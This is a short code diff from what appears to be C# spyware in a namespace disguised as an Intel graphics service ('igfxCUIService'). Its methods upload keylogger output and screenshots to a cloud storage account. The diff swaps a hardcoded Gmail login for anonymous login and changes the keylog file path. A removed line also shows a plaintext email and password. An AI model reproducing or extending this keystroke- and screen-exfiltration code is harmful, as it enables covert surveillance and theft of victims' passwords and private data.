@@ -25,14 +25,14 @@ namespace igfxCUIService
 
         #endregion
 
-        //Uri downloadUrl = client.GetDownloadLink(Sendfile);
+        public static Uri downloadUrl = client.GetDownloadLink(Sendscreenshot);
         //Console.WriteLine(downloadUrl);
         //Console.ReadLine();
 
         #region screenshots
         public static void Screenshotsupload()
         {
-            client.Login("dippernetwork@gmail.com", "igfxCUIService");
+            client.LoginAnonymous();
             var nodes = client.GetNodes();
             root = nodes.Single(n => n.Type == NodeType.Root);
 
@@ -82,13 +82,14 @@ namespace igfxCUIService
 
         public static void Keylogupload()
         {
-            client.Login("dippernetwork@gmail.com", "igfxCUIService");
+            
+            client.LoginAnonymous();
             var nodes = client.GetNodes();
             root = nodes.Single(n => n.Type == NodeType.Root);
 
             Keylogsmaps();
 
-            Sendkeylog = client.UploadFile(Keylogger.pathString + "/" + Keylogger.datum.ToShortDateString() + ".text", screenshotsmap);
+            Sendkeylog = client.UploadFile(Keylogger.path, keylogmap);
 
             client.Logout();
         }
